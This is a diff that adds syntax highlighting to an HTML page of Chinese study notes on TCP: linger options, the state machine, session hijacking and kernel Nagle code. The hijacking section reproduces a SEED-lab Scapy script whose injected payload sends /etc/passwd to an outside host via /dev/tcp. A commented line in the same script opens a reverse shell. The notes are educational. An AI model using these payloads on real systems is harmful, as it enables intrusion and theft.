@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2023-02-02 Thu 21:55 -->
+<!-- 2023-02-15 Wed 22:05 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>TCP</title>
@@ -451,10 +451,10 @@ MSL 的单位是秒， TTL 的单位是路由跳数， MSL 要大于 TTL 消耗�
 设置 <a href="20220718-socket.html#ID-8f85e772-fcef-4d79-9314-c30b08caa0b1">Socket</a> 选项调整 close 关闭连接的行为：
 </p>
 <div class="org-src-container">
-<pre class="src src-c">struct linger so_linger;
-so_linger.l_onff = 1;
-so_linger.l_linger = 0;
-setsockopt(s, SOL_SOCKET, SO_LINGER, &amp;so_linger, sizeof(so_linger));
+<pre class="src src-c"><span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">linger</span> <span style="color: #BA36A5;">so_linger</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+so_linger<span style="color: #333333; background-color: #FFFFFF;">.</span><span style="color: #BA36A5; font-style: italic;">l_onff</span> <span style="color: #0000FF;">=</span> <span style="color: #D0372D;">1</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+so_linger<span style="color: #333333; background-color: #FFFFFF;">.</span><span style="color: #BA36A5; font-style: italic;">l_linger</span> <span style="color: #0000FF;">=</span> <span style="color: #D0372D;">0</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+<span style="color: #006DAF;">setsockopt</span><span style="color: #707183; background-color: #FFFFFF;">(</span>s<span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #D0372D;">SOL_SOCKET</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #D0372D;">SO_LINGER</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #0000FF;">&amp;</span>so_linger<span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #0000FF;">sizeof</span><span style="color: #7388D6; background-color: #FFFFFF;">(</span>so_linger<span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #707183; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
 </pre>
 </div>
 <p>
@@ -621,7 +621,7 @@ ACK packet can carry data, don&rsquo;t consume sequence number if it don&rsquo;t
 <h2 id="orgcf9c96c">TCP 有限状态机</h2>
 <div class="outline-text-2" id="text-orgcf9c96c">
 
-<figure id="org334b325">
+<figure id="org5e68321">
 <img src="../images/20220715-tcp_1.png" alt="20220715-tcp_1.png">
 
 </figure>
@@ -654,24 +654,24 @@ ACK packet can carry data, don&rsquo;t consume sequence number if it don&rsquo;t
 危害：如果接收方是 telnet 服务器，那从发送方到接收方的数据就是命令，一旦控制了该会话，就可以让 telnet 服务器运行攻击者的命令， 这就是把这类攻击称为 TCP 会话劫持的原因。具体是在客户端连接到服务器时，攻击者抓包得到序列号从而伪造数据包。例如：
 </p>
 <div class="org-src-container">
-<pre class="src src-python">#!/usr/bin/env python3
-'''
-http://note.blueegg.net.cn/seed-labs/tcp/session-attack/
-'''
-import sys
-from scapy.all import *
+<pre class="src src-python"><span style="color: #8D8D84; font-style: italic;">#!/usr/bin/env python3</span>
+<span style="color: #008000;">'''</span>
+<span style="color: #008000;">http://note.blueegg.net.cn/seed-labs/tcp/session-attack/</span>
+<span style="color: #008000;">'''</span>
+<span style="color: #0000FF;">import</span> sys
+<span style="color: #0000FF;">from</span> scapy.all <span style="color: #0000FF;">import</span> <span style="color: #0000FF;">*</span>
 
-print("SENDING SESSION HIJACKING PACKET.....")
-client_addr = "192.168.230.151"
-server_addr = "192.168.230.150"
+<span style="color: #006FE0;">print</span>(<span style="color: #008000;">"SENDING SESSION HIJACKING PACKET....."</span>)
+<span style="color: #BA36A5;">client_addr</span> <span style="color: #0000FF;">=</span> <span style="color: #008000;">"192.168.230.151"</span>
+<span style="color: #BA36A5;">server_addr</span> <span style="color: #0000FF;">=</span> <span style="color: #008000;">"192.168.230.150"</span>
 
-IPLayer = IP(src=client_addr, dst=server_addr)
-TCPLayer = TCP(sport=38276, dport=23, flags="A", seq=2833231448, ack=1828464701)
-Data = "\r cat /etc/passwd &gt; /dev/tcp/192.168.230.1/9090\r"
-# Data = "\r /bin/bash -i &gt; /dev/tcp/192.168.230.1/9090 2&gt;&amp;1 0&lt;&amp;1 \r" # get shell
-pkt = IPLayer/TCPLayer/Data
-ls(pkt)
-end(pkt, verbose=0)
+<span style="color: #BA36A5;">IPLayer</span> <span style="color: #0000FF;">=</span> <span style="color: #D0372D;">IP</span>(<span style="color: #808080;">src</span><span style="color: #0000FF;">=</span>client_addr, <span style="color: #808080;">dst</span><span style="color: #0000FF;">=</span>server_addr)
+<span style="color: #BA36A5;">TCPLayer</span> <span style="color: #0000FF;">=</span> <span style="color: #D0372D;">TCP</span>(<span style="color: #808080;">sport</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">38276</span>, <span style="color: #808080;">dport</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">23</span>, <span style="color: #808080;">flags</span><span style="color: #0000FF;">=</span><span style="color: #008000;">"A"</span>, <span style="color: #808080;">seq</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">2833231448</span>, <span style="color: #808080;">ack</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">1828464701</span>)
+<span style="color: #BA36A5;">Data</span> <span style="color: #0000FF;">=</span> <span style="color: #008000;">"</span><span style="color: #0000FF;">\r</span><span style="color: #008000;"> cat /etc/passwd &gt; /dev/tcp/192.168.230.1/9090</span><span style="color: #0000FF;">\r</span><span style="color: #008000;">"</span>
+<span style="color: #8D8D84; font-style: italic;"># Data = "\r /bin/bash -i &gt; /dev/tcp/192.168.230.1/9090 2&gt;&amp;1 0&lt;&amp;1 \r" # get shell</span>
+<span style="color: #BA36A5;">pkt</span> <span style="color: #0000FF;">=</span> <span style="color: #6434A3;">IPLayer</span><span style="color: #0000FF;">/</span><span style="color: #6434A3;">TCPLayer</span><span style="color: #0000FF;">/</span><span style="color: #6434A3;">Data</span>
+<span style="color: #006DAF;">ls</span>(pkt)
+<span style="color: #006DAF;">end</span>(pkt, <span style="color: #808080;">verbose</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">0</span>)
 </pre>
 </div>
 </div>
@@ -997,57 +997,57 @@ ssthresh = cwnd
 Linux Kernel 3.4.4:
 </p>
 <div class="org-src-container">
-<pre class="src src-c">// Filename : \linux-3.4.4\net\ipv4\tcp_output.c:1384
-/* Return 0, if packet can be sent now without violation Nagle's rules:
- * 1. It is full sized.
- * 2. Or it contains FIN. (already checked by caller)
- * 3. Or TCP_CORK is not set, and TCP_NODELAY is set.
- * 4. Or TCP_CORK is not set, and all sent packets are ACKed.
- *    With Minshall's modification: all sent small packets are ACKed.
- */
-static inline int tcp_nagle_check(const struct tcp_sock *tp,
-                  const struct sk_buff *skb,
-                  unsigned mss_now, int nonagle)
-{
-    return skb-&gt;len &lt; mss_now &amp;&amp; // &#25968;&#25454;&#38271;&#24230;&#19981;&#22815;
-        ((nonagle &amp; TCP_NAGLE_CORK) || // &#26410;&#24320;&#21551; nagle &#26102;&#20869;&#26680;&#21152;&#22622;(cork)&#20102;
-         (!nonagle &amp;&amp; tp-&gt;packets_out &amp;&amp; tcp_minshall_check(tp)));
-         // &#24320;&#21551;&#20102; nagle &#19988;&#27809;&#26377;&#26410;&#30830;&#35748;&#30340;&#23567;&#21253;
-         // &#36820;&#22238; 1 &#34920;&#31034;&#19981;&#31435;&#21363;&#21457;&#36865;&#65292;&#24773;&#20917;&#26159;
-         // 1. &#38271;&#24230;&#19981;&#22815; &#19988; &#21152;&#22622;
-         // 2. &#38271;&#24230;&#19981;&#22815; &#19988; &#24320;&#21551;&#20102; nagle &#19988; &#26377;&#26410;&#34987;&#30830;&#35748;&#30340;&#23567;&#21253;
-         // tp-&gt;packets_out &#20026;&#30495;&#34920;&#31034;&#23384;&#22312;&#26410;&#34987;&#30830;&#35748;&#30340;&#21253;
-         // tcp_minshall_check &#20026;&#30495;&#34920;&#31034;&#23384;&#22312;&#26410;&#34987;&#30830;&#35748;&#30340;&#23567;&#21253;&#65288;&#25913;&#36827;&#65289;
-         // tcp_minshall_check: \linux-3.4.4\net\ipv4\tcp_output.c:1378
-}
+<pre class="src src-c"><span style="color: #8D8D84; font-style: italic;">// Filename : \linux-3.4.4\net\ipv4\tcp_output.c:1384</span>
+<span style="color: #8D8D84; font-style: italic;">/* Return 0, if packet can be sent now without violation Nagle's rules:</span>
+<span style="color: #8D8D84; font-style: italic;"> * 1. It is full sized.</span>
+<span style="color: #8D8D84; font-style: italic;"> * 2. Or it contains FIN. (already checked by caller)</span>
+<span style="color: #8D8D84; font-style: italic;"> * 3. Or TCP_CORK is not set, and TCP_NODELAY is set.</span>
+<span style="color: #8D8D84; font-style: italic;"> * 4. Or TCP_CORK is not set, and all sent packets are ACKed.</span>
+<span style="color: #8D8D84; font-style: italic;"> *    With Minshall's modification: all sent small packets are ACKed.</span>
+<span style="color: #8D8D84; font-style: italic;"> */</span>
+<span style="color: #0000FF;">static</span> <span style="color: #0000FF;">inline</span> <span style="color: #006FE0;">int</span> <span style="color: #006699;">tcp_nagle_check</span><span style="color: #707183; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">tcp_sock</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5;">tp</span><span style="color: #333333; background-color: #FFFFFF;">,</span>
+                  <span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">sk_buff</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5;">skb</span><span style="color: #333333; background-color: #FFFFFF;">,</span>
+                  <span style="color: #006FE0;">unsigned</span> <span style="color: #BA36A5;">mss_now</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #006FE0;">int</span> <span style="color: #BA36A5;">nonagle</span><span style="color: #707183; background-color: #FFFFFF;">)</span>
+<span style="color: #707183; background-color: #FFFFFF;">{</span>
+    <span style="color: #0000FF;">return</span> skb<span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">len</span> <span style="color: #0000FF;">&lt;</span> mss_now <span style="color: #0000FF;">&amp;&amp;</span> <span style="color: #8D8D84; font-style: italic;">// &#25968;&#25454;&#38271;&#24230;&#19981;&#22815;</span>
+        <span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #909183; background-color: #FFFFFF;">(</span>nonagle <span style="color: #0000FF;">&amp;</span> <span style="color: #D0372D;">TCP_NAGLE_CORK</span><span style="color: #909183; background-color: #FFFFFF;">)</span> <span style="color: #0000FF;">||</span> <span style="color: #8D8D84; font-style: italic;">// &#26410;&#24320;&#21551; nagle &#26102;&#20869;&#26680;&#21152;&#22622;(cork)&#20102;</span>
+         <span style="color: #909183; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">!</span>nonagle <span style="color: #0000FF;">&amp;&amp;</span> tp<span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">packets_out</span> <span style="color: #0000FF;">&amp;&amp;</span> <span style="color: #006DAF;">tcp_minshall_check</span><span style="color: #709870; background-color: #FFFFFF;">(</span>tp<span style="color: #709870; background-color: #FFFFFF;">)</span><span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+         <span style="color: #8D8D84; font-style: italic;">// &#24320;&#21551;&#20102; nagle &#19988;&#27809;&#26377;&#26410;&#30830;&#35748;&#30340;&#23567;&#21253;</span>
+         <span style="color: #8D8D84; font-style: italic;">// &#36820;&#22238; 1 &#34920;&#31034;&#19981;&#31435;&#21363;&#21457;&#36865;&#65292;&#24773;&#20917;&#26159;</span>
+         <span style="color: #8D8D84; font-style: italic;">// 1. &#38271;&#24230;&#19981;&#22815; &#19988; &#21152;&#22622;</span>
+         <span style="color: #8D8D84; font-style: italic;">// 2. &#38271;&#24230;&#19981;&#22815; &#19988; &#24320;&#21551;&#20102; nagle &#19988; &#26377;&#26410;&#34987;&#30830;&#35748;&#30340;&#23567;&#21253;</span>
+         <span style="color: #8D8D84; font-style: italic;">// tp-&gt;packets_out &#20026;&#30495;&#34920;&#31034;&#23384;&#22312;&#26410;&#34987;&#30830;&#35748;&#30340;&#21253;</span>
+         <span style="color: #8D8D84; font-style: italic;">// tcp_minshall_check &#20026;&#30495;&#34920;&#31034;&#23384;&#22312;&#26410;&#34987;&#30830;&#35748;&#30340;&#23567;&#21253;&#65288;&#25913;&#36827;&#65289;</span>
+         <span style="color: #8D8D84; font-style: italic;">// tcp_minshall_check: \linux-3.4.4\net\ipv4\tcp_output.c:1378</span>
+<span style="color: #707183; background-color: #FFFFFF;">}</span>
 
-/* Return non-zero if the Nagle test allows this packet to be
- * sent now.
- */
-static inline int tcp_nagle_test(const struct tcp_sock *tp, const struct sk_buff *skb,
-                 unsigned int cur_mss, int nonagle)
-{
-    /* Nagle rule does not apply to frames, which sit in the middle of the
-     * write_queue (they have no chances to get new data).
-     *
-     * This is implemented in the callers, where they modify the 'nonagle'
-     * argument based upon the location of SKB in the send queue.
-     */
-    if (nonagle &amp; TCP_NAGLE_PUSH)
-        return 1;
+<span style="color: #8D8D84; font-style: italic;">/* Return non-zero if the Nagle test allows this packet to be</span>
+<span style="color: #8D8D84; font-style: italic;"> * sent now.</span>
+<span style="color: #8D8D84; font-style: italic;"> */</span>
+<span style="color: #0000FF;">static</span> <span style="color: #0000FF;">inline</span> <span style="color: #006FE0;">int</span> <span style="color: #006699;">tcp_nagle_test</span><span style="color: #707183; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">tcp_sock</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5;">tp</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">sk_buff</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5;">skb</span><span style="color: #333333; background-color: #FFFFFF;">,</span>
+                 <span style="color: #006FE0;">unsigned int</span> <span style="color: #BA36A5;">cur_mss</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #006FE0;">int</span> <span style="color: #BA36A5;">nonagle</span><span style="color: #707183; background-color: #FFFFFF;">)</span>
+<span style="color: #707183; background-color: #FFFFFF;">{</span>
+    <span style="color: #8D8D84; font-style: italic;">/* Nagle rule does not apply to frames, which sit in the middle of the</span>
+<span style="color: #8D8D84; font-style: italic;">     * write_queue (they have no chances to get new data).</span>
+<span style="color: #8D8D84; font-style: italic;">     *</span>
+<span style="color: #8D8D84; font-style: italic;">     * This is implemented in the callers, where they modify the 'nonagle'</span>
+<span style="color: #8D8D84; font-style: italic;">     * argument based upon the location of SKB in the send queue.</span>
+<span style="color: #8D8D84; font-style: italic;">     */</span>
+    <span style="color: #0000FF;">if</span> <span style="color: #7388D6; background-color: #FFFFFF;">(</span>nonagle <span style="color: #0000FF;">&amp;</span> <span style="color: #D0372D;">TCP_NAGLE_PUSH</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span>
+        <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">1</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
 
-    /* Don't use the nagle rule for urgent data (or for the final FIN).
-     * Nagle can be ignored during F-RTO too (see RFC4138).
-     */
-    if (tcp_urg_mode(tp) || (tp-&gt;frto_counter == 2) ||
-        (TCP_SKB_CB(skb)-&gt;tcp_flags &amp; TCPHDR_FIN))
-        return 1;
+    <span style="color: #8D8D84; font-style: italic;">/* Don't use the nagle rule for urgent data (or for the final FIN).</span>
+<span style="color: #8D8D84; font-style: italic;">     * Nagle can be ignored during F-RTO too (see RFC4138).</span>
+<span style="color: #8D8D84; font-style: italic;">     */</span>
+    <span style="color: #0000FF;">if</span> <span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #006DAF;">tcp_urg_mode</span><span style="color: #909183; background-color: #FFFFFF;">(</span>tp<span style="color: #909183; background-color: #FFFFFF;">)</span> <span style="color: #0000FF;">||</span> <span style="color: #909183; background-color: #FFFFFF;">(</span>tp<span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">frto_counter</span> <span style="color: #0000FF;">==</span> <span style="color: #D0372D;">2</span><span style="color: #909183; background-color: #FFFFFF;">)</span> <span style="color: #0000FF;">||</span>
+        <span style="color: #909183; background-color: #FFFFFF;">(</span><span style="color: #006DAF;">TCP_SKB_CB</span><span style="color: #709870; background-color: #FFFFFF;">(</span>skb<span style="color: #709870; background-color: #FFFFFF;">)</span><span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">tcp_flags</span> <span style="color: #0000FF;">&amp;</span> <span style="color: #D0372D;">TCPHDR_FIN</span><span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span>
+        <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">1</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
 
-    if (!tcp_nagle_check(tp, skb, cur_mss, nonagle))
-        return 1;
+    <span style="color: #0000FF;">if</span> <span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">!</span><span style="color: #006DAF;">tcp_nagle_check</span><span style="color: #909183; background-color: #FFFFFF;">(</span>tp<span style="color: #333333; background-color: #FFFFFF;">,</span> skb<span style="color: #333333; background-color: #FFFFFF;">,</span> cur_mss<span style="color: #333333; background-color: #FFFFFF;">,</span> nonagle<span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span>
+        <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">1</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
 
-    return 0;
-}
+    <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">0</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+<span style="color: #707183; background-color: #FFFFFF;">}</span>
 </pre>
 </div>
 
@@ -1084,16 +1084,16 @@ tcp_probe_timer() -&gt; tcp_send_probe0() -&gt; tcp_write_wakeup() -&gt; tcp_tra
 确保在一个 RTT 内只有一个当前连接的小包，可以在一定程度上的缓解因为 Nagle 和 DelayAck 同时开启时奇数小包阻塞的问题。
 </p>
 <div class="org-src-container">
-<pre class="src src-c">static inline int tcp_minshall_check(const struct tcp_sock *tp)
-{
-    reutrn after(tp-&gt;snd_sml, tp-&gt;snd_una) &amp;&amp;
-        !after(tp-&gt;snd_sml, tp-&gt;snd_nxt);
-}
+<pre class="src src-c"><span style="color: #0000FF;">static</span> <span style="color: #0000FF;">inline</span> <span style="color: #006FE0;">int</span> <span style="color: #006699;">tcp_minshall_check</span><span style="color: #707183; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">tcp_sock</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5;">tp</span><span style="color: #707183; background-color: #FFFFFF;">)</span>
+<span style="color: #707183; background-color: #FFFFFF;">{</span>
+    <span style="color: #6434A3;">reutrn</span> <span style="color: #006699;">after</span><span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #6434A3;">tp</span><span style="color: #0000FF;">-&gt;</span><span style="color: #BA36A5;">snd_sml</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #6434A3;">tp</span><span style="color: #0000FF;">-&gt;</span><span style="color: #BA36A5;">snd_una</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span> <span style="color: #0000FF;">&amp;&amp;</span>
+        <span style="color: #0000FF;">!</span><span style="color: #006DAF;">after</span><span style="color: #7388D6; background-color: #FFFFFF;">(</span>tp<span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">snd_sml</span><span style="color: #333333; background-color: #FFFFFF;">,</span> tp<span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">snd_nxt</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+<span style="color: #707183; background-color: #FFFFFF;">}</span>
 </pre>
 </div>
 
 
-<figure id="org62c3bae">
+<figure id="orgfe894ae">
 <img src="../images/tcp_nagle_minshall.png" alt="tcp_nagle_minshall.png">
 
 </figure>
